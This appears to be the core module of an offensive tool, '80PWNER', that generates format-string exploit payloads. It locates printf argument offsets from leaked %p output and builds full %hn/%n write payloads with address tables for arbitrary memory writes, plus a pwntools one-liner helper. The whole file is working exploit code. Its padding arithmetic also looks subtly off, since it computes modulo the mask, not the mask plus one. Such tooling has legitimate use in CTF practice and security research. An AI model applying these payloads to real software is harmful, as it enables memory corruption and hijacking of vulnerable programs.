# 80PWNER — by Anas Mahfouz (The 80)
# Copyright (c) 2026 Anas Mahfouz (The 80). MIT License.

"""Format-string exploitation helper (Payload Studio core).

Two jobs:

1. **Find the offset** — parse real `%p` output (or a raw leaked value) and
   report which printf argument held your marker; optionally turn that into
   the classic pwntools ``fmtstr_payload`` one-liner.
2. **Plan the writes** — build a concrete ``%hn`` write plan (format string +
   little-endian address table) for arbitrary-address writes, with the printed
   count tracked exactly. The default 2-byte write size keeps padding sane.

Pure engine: no Qt.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field

MAX_WRITE_SIZE = 8


@dataclass(frozen=True)
class FmtWrite:
    address: int
    value: int
    size: int = 2


@dataclass
class FmtPlan:
    offset: int
    writes: list[FmtWrite] = field(default_factory=list)
    format_string: str = ""
    raw: bytes = b""
    note: str = ""

    def text(self) -> str:
        lines = [f"# arg offset {self.offset} — {len(self.writes)} writes"]
        for write in self.writes:
            lines.append(
                f"#   {write.address:#x} <- {write.value & ((1 << (write.size * 8)) - 1):#x} "
                f"({write.size} bytes)"
            )
        lines.append(repr(self.raw))
        return "\n".join(lines)


def _arg_tokens(output: str) -> list[str]:
    """Split ``%p`` output into argument-position tokens.

    Every token counts as one argument slot — including ``(nil)`` and
    non-hex output — because the index we report must be the real printf
    argument position, not the position among hex-looking values.
    """
    tokens: list[str] = []
    for token in re.split(r"[\s|,;]+", output.strip()):
        token = token.strip("()[]{}<>\"'")
        if token:
            tokens.append(token)
    return tokens


def find_marker(output: str, marker: str = "41414141") -> tuple[int, str] | None:
    """Locate *marker* in ``%p`` output → ``(1-based argument index, token)``.

    Accepts raw hex or truncation: ``0x41414141deadbeef``, ``41414141`` and
    ``...41414141`` all match. When the marker appears in both halves of a
    16-digit value, the earlier index wins.
    """
    needle = marker.strip().lower().removeprefix("0x")
    if not needle:
        return None
    for index, token in enumerate(_arg_tokens(output), start=1):
        candidate = token.lower().removeprefix("0x")
        if re.fullmatch(r"[0-9a-f]+", candidate) and needle in candidate:
            return index, candidate
    return None


def find_marker_in_value(leaked: int, marker: int = 0x41414141, bits: int = 64) -> bool:
    """True when *marker* appears inside a leaked register value."""
    raw = leaked.to_bytes(max(bits // 8, 1), "little")
    return marker.to_bytes(4, "little") in raw


def pwntools_payload(offset: int, writes: list[tuple[int, int]], size: str = "short") -> str:
    mapping = ", ".join(f"{address:#x}: {value:#x}" for address, value in writes)
    return f"fmtstr_payload({offset}, {{{mapping}}}, write_size={size!r})"


def write_plan(
    offset: int,
    writes: list[tuple[int, int]],
    bits: int = 64,
    write_size: int = 2,
    bad_bytes: bytes = b"",
) -> FmtPlan:
    """Build a concrete ``%n`` payload.

    The address table goes *after* the format string (NUL bytes in addresses
    would otherwise terminate printf early), padded to the pointer size. Each
    address therefore occupies a known argument slot right after the format
    string's words.

    *offset* is the printf argument index of the first 8 bytes of your buffer
    (found with ``%p``). *writes* are ``(address, value)`` pairs.
    """
    if write_size not in (1, 2, 4, 8):
        raise ValueError("write_size must be 1, 2, 4 or 8")
    if not writes:
        raise ValueError("No writes requested")
    ptr = bits // 8
    if write_size > ptr:
        raise ValueError("write_size cannot exceed the pointer size")
    mask = (1 << (write_size * 8)) - 1

    # Split each requested value into write_size chunks, low half first.
    chunks: list[tuple[int, int]] = []  # (value_chunk, address)
    for address, value in writes:
        if address <= 0:
            raise ValueError("Write addresses must be positive")
        remaining = value & ((1 << (ptr * 8)) - 1)
        for part in range(0, ptr, write_size):
            piece = (remaining >> (part * 8)) & mask
            chunks.append((piece, address + part))
    # Writing the smallest values first minimises the padding widths.
    chunks.sort(key=lambda pair: (pair[0], pair[1]))

    def render(index_base: int) -> tuple[str, int]:
        text = ""
        printed = 0
        address_index = index_base
        spec = {1: "hhn", 2: "hn", 4: "n", 8: "ln"}[write_size]
        for piece, _address in chunks:
            pad = (piece - printed) % mask if mask else 0
            if pad:
                text += f"%{pad}c"
                printed = piece
            text += f"%{address_index}${spec}"
            address_index += 1
        return text, printed

    # Iterate: the rendered length decides how many words the format string
    # occupies, which decides the address argument indices.
    fmt = ""
    index_base = offset
    for _ in range(4):
        fmt, _printed = render(index_base)
        padded_len = ((len(fmt.encode()) + ptr - 1) // ptr) * ptr
        new_base = offset + padded_len // ptr
        if new_base == index_base:
            break
        index_base = new_base

    fmt_bytes = fmt.encode()
    pad = ((len(fmt_bytes) + ptr - 1) // ptr) * ptr - len(fmt_bytes)
    payload = fmt_bytes + b"A" * pad
    for _piece, address in chunks:
        payload += address.to_bytes(ptr, "little")

    note_bits: list[str] = [
        f"{len(chunks)} writes, {len(payload)} bytes total",
        f"format string occupies {len(fmt_bytes) // ptr + (1 if len(fmt_bytes) % ptr else 0)} word(s)",
        f"address slots start at ${index_base}",
    ]
    if bad_bytes:
        offenders = [i for i, value in enumerate(payload) if value in bad_bytes]
        if offenders:
            note_bits.append(
                f"bad bytes at payload offsets {offenders[:8]}"
                + (" …" if len(offenders) > 8 else "")
            )
    if b"\x00" in payload:
        note_bits.append("payload contains NUL bytes (address table) — expected")
    plan = FmtPlan(
        offset=offset,
        writes=[FmtWrite(address=address, value=piece, size=write_size) for piece, address in chunks],
        format_string=fmt,
        raw=payload,
        note="; ".join(note_bits),
    )
    return plan


def build_plan(
    offset: int,
    writes: list[tuple[int, int]],
    bits: int = 64,
    write_size: int = 2,
    bad_bytes: bytes = b"",
) -> FmtPlan:
    """Alias kept for call-site readability."""
    return write_plan(offset, writes, bits=bits, write_size=write_size, bad_bytes=bad_bytes)
